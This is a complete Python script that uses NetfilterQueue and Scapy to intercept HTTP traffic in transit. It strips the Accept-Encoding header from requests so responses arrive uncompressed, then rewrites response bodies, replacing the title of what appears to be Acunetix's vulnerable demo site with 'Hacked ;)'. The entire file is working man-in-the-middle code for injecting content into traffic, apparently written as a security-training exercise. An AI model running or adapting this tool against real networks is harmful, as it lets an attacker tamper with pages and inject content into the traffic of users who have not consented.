#!/usr/bin/env python3
"""
HTTP Packet Modifier with NetfilterQueue.

This script intercepts HTTP requests and responses and modifies them accordingly.

Usage:
  python3 http_packet_modifier.py

Example:
  python3 http_packet_modifier.py
"""

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    """
    Sets the payload of the given packet with the specified load.

    Args:
        packet (scapy.Packet): The packet to modify.
        load (bytes): The new payload to set.

    Returns:
        scapy.Packet: The modified packet.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    """
    Processes packets from the netfilter queue and modifies HTTP requests and responses.

    Args:
        packet (netfilterqueue.packet): The packet from the netfilter queue.
    """
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"[+] Request to the server")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                print(f"[+] Response from the server")
                modified_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art", b"Hacked ;)")
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
        except Exception as e:
            print(f"[!] Error: {e}")

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
